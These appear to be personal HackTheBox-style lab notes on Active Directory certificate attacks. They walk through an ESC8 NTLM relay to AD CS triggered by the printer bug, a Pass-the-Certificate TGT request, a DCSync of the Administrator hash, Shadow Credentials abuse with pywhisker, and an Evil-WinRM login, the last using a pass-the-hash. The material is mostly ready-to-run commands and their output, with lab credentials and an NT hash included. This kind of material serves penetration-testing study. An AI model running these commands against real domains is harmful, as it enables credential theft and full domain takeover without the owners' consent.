# Pass the Certificate

## AD CS NTLM Relay Attack (ESC8)

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Attackers can use Impacket’s [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to listen for inbound connections and relay them to the web enrollment service using the following command:

```shell-session
eldeim@htb[/htb]$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

> Note: The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

Attackers can either wait for victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. One way to force machine accounts to authenticate against arbitrary hosts is by exploiting the [printer bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py). This attack requires the targeted machine account to have the `Printer Spooler` service running. The command below forces `10.129.234.109 (DC01)` to attempt authentication against `10.10.16.12 (attacker host)`:

```shell-session
eldeim@htb[/htb]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12

[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attempting to trigger authentication via rprn RPC at 10.129.234.109
[*] Bind OK
[*] Got handle
RPRN SessionError: code: 0x6ba - RPC_S_SERVER_UNAVAILABLE - The RPC server is unavailable.
[*] Triggered RPC backconnect, this may or may not have worked
```

Referring back to `ntlmrelayx`, we can see from the output that the authentication request was successfully relayed to the web enrollment application, and a certificate was issued for `DC01$`:

```shell-session
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
[*] HTTP server returned error code 404, treating as a successful login
[*] Authenticating against http://10.129.234.110 as INLANEFREIGHT/DC01$ SUCCEED
[*] SMBD-Thread-7 (process_request_thread): Received connection from 10.129.234.109, attacking target http://10.129.234.110
[-] Authenticating against http://10.129.234.110 as / FAILED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE! ID 8
[*] Writing PKCS#12 certificate to ./DC01$.pfx
[*] Certificate successfully written to file
```

We can now perform a `Pass-the-Certificate` attack to obtain a TGT as `DC01$`. One way to do this is by using [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py). First, let's clone the repository and install the dependencies:

```shell-session
eldeim@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
eldeim@htb[/htb]$ python3 -m venv .venv
eldeim@htb[/htb]$ source .venv/bin/activate
eldeim@htb[/htb]$ pip3 install -r requirements.txt
```

Then, we can begin the attack.

> Note: If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

```shell-session
eldeim@htb[/htb]$ pip3 install -I git+https://github.com/wbond/oscrypto.git
Defaulting to user installation because normal site-packages is not writeable
Collecting git+https://github.com/wbond/oscrypto.git
<SNIP>
Successfully built oscrypto
Installing collected packages: asn1crypto, oscrypto
Successfully installed asn1crypto-1.5.1 oscrypto-1.3.0
```

```shell-session
eldeim@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

2025-04-28 21:20:40,073 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-28 21:20:40,351 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-28 21:21:05,508 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-28 21:21:05,508 minikerberos INFO     3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
INFO:minikerberos:3a1d192a28a4e70e02ae4f1d57bad4adbc7c0b3e7dceb59dab90b8a54f39d616
2025-04-28 21:21:05,512 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

```shell-session
eldeim@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
eldeim@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...SNIP...:::
<SNIP>
```

## Shadow Credentials (msDS-KeyCredentialLink)

[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) refers to an Active Directory attack that abuses the [msDS-KeyCredentialLink](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f70afbcc-780e-4d91-850c-cfadce5bb15c) attribute of a victim user. This attribute stores public keys that can be used for authentication via PKINIT. In BloodHound, the `AddKeyCredentialLink` edge indicates that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of that user.

![Diagram showing a connection between two users, wwhite@inlanefreight.locall and jpinkman@inlanefreight.locall, labeled "AddKeyCredentialLink."](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/308/img/PtC_2.png)

We can use [pywhisker](https://github.com/ShutdownRepo/pywhisker) to perform this attack from a Linux system. The command below generates an `X.509 certificate` and writes the `public key` to the victim user's `msDS-KeyCredentialLink` attribute:

```shell-session
eldeim@htb[/htb]$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3496da7f-ab0d-13e0-1273-5abca66f901d
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: eFUVVTPf.pfx
[+] PFX exportiert nach: eFUVVTPf.pfx
[i] Passwort für PFX: bmRH4LK7UwPrAOfvIx6W
[+] Saved PFX (#PKCS12) certificate & key at path: eFUVVTPf.pfx
[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

In the output above, we can see that a `PFX (PKCS12)` file was created (`eFUVVTPf.pfx`), and the password is shown. We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:

```shell-session
eldeim@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2025-04-28 20:50:04,728 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-04-28 20:50:04,775 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-04-28 20:50:04,929 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-04-28 20:50:04,929 minikerberos INFO     f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
INFO:minikerberos:f4fa8808fb476e6f982318494f75e002f8ee01c64199b3ad7419f927736ffdb8
2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

With the TGT obtained, we may once again `pass the ticket`:

```shell-session
eldeim@htb[/htb]$ export KRB5CCNAME=/tmp/jpinkman.ccache
eldeim@htb[/htb]$ klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

In this case, we discovered that the victim user is a member of the `Remote Management Users` group, which permits them to connect to the machine via `WinRM`. As demonstrated in the previous section, we can use `Evil-WinRM` to connect using Kerberos (note: ensure that `krb5.conf` is properly configured):

```shell-session
eldeim@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jpinkman\Documents> whoami
inlanefreight\jpinkman
```

***

### Lab - Questions

* PTCDC01: 10.129.234.174
* PTCCA01: 10.129.234.172
* user "wwhite" & password "package5shores\_topher1"

Fristly, set the relay in the ip provided the ca -->

```
impacket-ntlmrelayx -t http://10.129.234.172/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

After, we need do a printer bug attack with the DC ip and us local ip. We also need to install the tool:

```
git clone https://github.com/dirkjanm/krbrelayx.git
cd krbrelayx
```

```
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.174 10.10.14.182
```

<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

Once we have the file .pfx, try to obtain a TGT make a pass the certficate attack. Is necessary install the tool gettgtpkinit -->

```
cd ~
git clone https://github.com/dirkjanm/PKINITtools.git
cd PKINITtools
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install -I git+https://github.com/wbond/oscrypto.git
```

```
python3 gettgtpkinit.py -cert-pfx ../DC01\$.pfx -dc-ip 10.129.234.174 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

> Set the IP of DC and the directorie of .pfx file

```
2025-12-28 06:13:32,097 minikerberos INFO     Loading certificate and key from file
2025-12-28 06:13:32,303 minikerberos INFO     Requesting TGT
2025-12-28 06:13:41,944 minikerberos INFO     AS-REP encryption key (you might need this later):
2025-12-28 06:13:41,944 minikerberos INFO     2a53a3429b9eb1135723ebdb31f683190384dea4cb81318bdcad319fcc958ae4
2025-12-28 06:13:41,950 minikerberos INFO     Saved TGT to file
```

Once we successfully obtain a TGT, we're back in familiar Pass-the-Ticket (PtT) territory. As the domain controller's machine account, we can perform a DCSync attack to, for example, retrieve the NTLM hash of the domain administrator account:

> Note: Set the DC into /etc/hosts
>
> 10.129.234.174 DC01.INLANEFREIGHT.LOCAL DC01

```
 export KRB5CCNAME=/tmp/dc.ccache
 impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Now, we can connect by being Administrator and read the flag...

<pre><code><strong>evil-winrm -i dc01.inlanefreight.local -u Administrator -H fd02e525dd676fd8ca04e200d265f20c
</strong> 
*Evil-WinRM* PS C:\Users\jpinkman\Desktop> type flag.txt
</code></pre>

* What are the contents of flag.txt on Administrator's desktop?

**Make Shadow Credentials (msDS-KeyCredentialLink)**

Fristly, git clone the pywhisker tool to after execute it-->

```
git clone https://github.com/ShutdownRepo/pywhisker
cd pywhisker/pywhisker
```

```
python3 pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Searching for the target account
[*] Target user found: CN=Jesse Pinkman,CN=Users,DC=inlanefreight,DC=local
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 6d2b4052-93cb-b17c-c7b3-497dd231be98
[*] Updating the msDS-KeyCredentialLink attribute of jpinkman
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: C21PhR2z.pfx
[+] PFX exportiert nach: C21PhR2z.pfx
[i] Passwort für PFX: IKGy2chsjDLKbbLaTTcf
[+] Saved PFX (#PKCS12) certificate & key at path: C21PhR2z.pfx
[*] Must be used with password: IKGy2chsjDLKbbLaTTcf
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```

&#x20;We can see that a `PFX (PKCS12)` file was created (`eFUVVTPf.pfx`), and the password is shown.

We will use this file with `gettgtpkinit.py` to acquire a TGT as the victim:

> Note: we need install the after module "oscrypto" and make it attack since a .venv

```
python3 gettgtpkinit.py -cert-pfx ../pywhisker/pywhisker/C21PhR2z.pfx -pfx-pass 'IKGy2chsjDLKbbLaTTcf' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2025-12-29 06:17:31,519 minikerberos INFO     Loading certificate and key from file
2025-12-29 06:17:31,546 minikerberos INFO     Requesting TGT
2025-12-29 06:17:43,449 minikerberos INFO     AS-REP encryption key (you might need this later):
2025-12-29 06:17:43,449 minikerberos INFO     0245e8348858f5bc343886649bbc873bb280a133db26ee2f5b296fce23c567f9
2025-12-29 06:17:43,454 minikerberos INFO     Saved TGT to file
```

Once we have the ticket, we can do the PTT -->

```
export KRB5CCNAME=/tmp/jpinkman.ccache
klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
12/29/2025 06:16:52  12/29/2025 16:16:52  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

We are now the user jpinkman, try to connect as jpinkman user via winrm -->

> Note: Fristly we need configurate the krb5.conf file -->

```
[libdefaults]
    default_realm = INLANEFREIGHT.LOCAL
    dns_lookup_kdc = false
    dns_lookup_realm = false
    rdns = false

[realms]
    INLANEFREIGHT.LOCAL = {
        kdc = dc01.inlanefreight.local
        admin_server = dc01.inlanefreight.local
    }

[domain_realm]
    .inlanefreight.local = INLANEFREIGHT.LOCAL
    inlanefreight.local = INLANEFREIGHT.LOCAL

```

```
evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

Evil-WinRM* PS C:\Users\jpinkman\Documents> 
```
